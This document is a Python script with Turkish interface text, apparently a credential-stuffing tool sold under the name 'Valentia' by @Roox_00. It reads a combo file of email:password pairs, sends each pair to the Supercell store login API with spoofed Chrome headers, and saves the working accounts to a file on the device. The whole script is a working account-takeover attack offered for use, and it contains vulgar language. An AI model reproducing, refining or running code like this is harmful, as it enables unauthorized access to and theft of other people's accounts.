import requests
import json
import os
import pyfiglet
from termcolor import colored
import webbrowser
import os
import time
import sys
from datetime import datetime

def yukleniyor(mesaj):
    bar = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]", "[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(5):
        for x in range(len(bar)):
            sys.stdout.write(f'\r{mesaj}{bar[x]}')
            time.sleep(0.04)
            sys.stdout.flush()

yukleniyor(" \x1b[1;36m     Api ile bağlantı kuruluyor bekle oç")

os.system('clear')

target_datetime = datetime(2124, 10, 20, 0, 0)


current_datetime = datetime.now()
if current_datetime >= target_datetime:
        exit(' Supercell Toollu  kapandı satın almak için @Roox_00')






print(colored(pyfiglet.figlet_format("Valentia"), 'red'))
print(colored("@Roox_00 | @ttWhyFLOPY 🎯", 'green'))

combo_path = input(colored("COMBO YOLUNU GİRİN: 🔍 ", 'blue'))

if not os.path.exists(combo_path):
    print(colored("BELİRTTİĞİNİZ YOLDA ÖYLE BİR DOSYA YOK ❌", 'red'))
    exit()
elif not os.path.isfile(combo_path):
    print(colored("DOSYA DİZİNİNİ YANLIŞ GİRDİNİZ ❗", 'red'))
    exit()

ROOX_SİKER = "ROOX_SİKER"

url = "https://store.supercell.com/api/customers/login?lang=en"

headers = {
    "origin": "https://store.supercell.com",
    "referer": "https://store.supercell.com/",
    "sec-ch-ua": "\"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"109\", \"Chromium\";v=\"109\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Content-Type": "application/json"
}

basarili_girisler = []

with open(combo_path, "r") as dosya:
    for satir in dosya:
        try:
            kullanici, sifre = satir.strip().split(":")
        except ValueError:
            print(colored(f"Hatalı format: {satir.strip()} ⚠️", 'yellow'))
            continue
        
        payload = json.dumps({"email": kullanici, "password": sifre})
        response = requests.post(url, headers=headers, data=payload)

        if response.status_code == 200 and "success" in response.text.lower():
            print(colored(f"ROOX_SİKER Giriş başarılı: {kullanici} ✅", 'green'))
            basarili_girisler.append(kullanici)
        else:
            print(colored(f"BAŞARISIZ GİRİŞ | Hesap: {kullanici}:{sifre} ❌", 'red'))

with open("/storage/emulated/0/Valentia.txt", "w") as basarili_dosya:
    for kullanici in basarili_girisler:
        basarili_dosya.write(f"{kullanici}\n")
print(colored(f"Başarılı girişler /storage/emulated/0/Valentia.txt dosyasına kaydedildi 📂", 'blue'))
